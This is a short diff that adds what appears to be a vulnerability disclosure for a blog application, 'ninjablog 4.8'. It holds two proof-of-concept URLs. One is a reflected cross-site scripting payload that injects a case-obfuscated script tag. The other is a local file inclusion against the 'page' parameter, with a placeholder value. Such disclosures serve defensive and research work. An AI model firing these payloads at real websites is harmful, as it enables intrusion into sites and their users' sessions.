@@ -1,0 +1,8 @@
+Cross-site scripting:
+ 
+http://www.example.com/ninjablog4.8/index.php/&gt;&quot;&gt;&lt;ScRiPt&gt;alert(213771818860)&lt;/ScRiPt&gt;
+ 
+
+Local file include:
+  
+ http://www.example.com/ninjablog4.8/entries/index.php?page=[EV!L]
